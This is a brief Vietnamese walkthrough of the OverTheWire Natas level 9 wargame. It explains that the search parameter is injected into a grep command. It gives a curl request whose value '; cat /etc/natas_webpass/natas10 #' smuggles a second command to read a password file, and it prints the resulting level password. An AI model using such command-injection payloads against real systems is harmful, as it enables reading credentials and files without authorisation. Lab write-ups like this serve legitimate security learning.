# Natas 9 → 10

## Mục tiêu

Command injection trong tham số tìm kiếm.

## Tôi thấy

Input `needle` được nối vào command grep; dấu `;` kết thúc grep và chạy cat.

## Cách làm

```bash
curl -u natas9:<password> --get --data-urlencode "needle=; cat /etc/natas_webpass/natas10 #" http://natas9.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

Shell thực thi input chưa được escape; dấu `#` comment phần command còn lại.

## Kết quả

Password của `natas10`:

```text
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```
